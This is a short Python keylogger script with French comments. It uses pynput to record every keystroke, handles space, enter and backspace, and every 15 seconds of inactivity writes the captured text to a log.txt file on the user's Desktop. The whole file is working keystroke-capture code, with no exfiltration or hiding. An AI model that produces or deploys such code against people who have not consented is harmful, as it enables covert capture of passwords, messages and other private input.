from pynput.keyboard import Key, Listener
import threading
import os
import time

last_keypress_time = time.time()  # initialiser la variable pour déterminer la denière frappe
is_first_run = True  # pour vérifier s'il s'agit de la première itération

#initialisation des variables
log = ""
path =  os.path.join(os.path.expanduser("~"), "Desktop/log.txt")

def processkeys(key):
    global log, last_keypress_time
    last_keypress_time = time.time()
    try:
        log += key.char
    except AttributeError:
        if key == Key.space:
            log += ' '
        elif key == Key.enter:
            log += '\n'
        elif key == Key.backspace:
            log = log[:-1]
        else:
            log += ''
    
    


def report():
    global log, path, is_first_run

    #vérifier si le fichier de log est vide ou pas
    if is_first_run:
            if os.path.exists(path) and os.path.getsize(path) > 0:
                with open(path, "a") as logfile:
                    logfile.write("\n")  # sauter une ligne si le fichier n'est pas vide
                    print("Fichier de log non vide, ajout nouvelle entrée")

            is_first_run = False  #assurer que cette action se produit qu'une seule fois

    if time.time() - last_keypress_time >= 15: #attend 15 secondes après la dernière frappe avant de sauvegarder dans le fichier de log
        if log:
            with open(path, "a") as logfile:
                logfile.write(log)
                print("Rapport enregistré (inactivité de 15s)")
            log = ""
            logfile.close()
    threading.Timer(1, report).start()
    

keyboard_listener = Listener(on_press=processkeys)
report()  # démarre le premier rapport

with keyboard_listener:
    keyboard_listener.join()

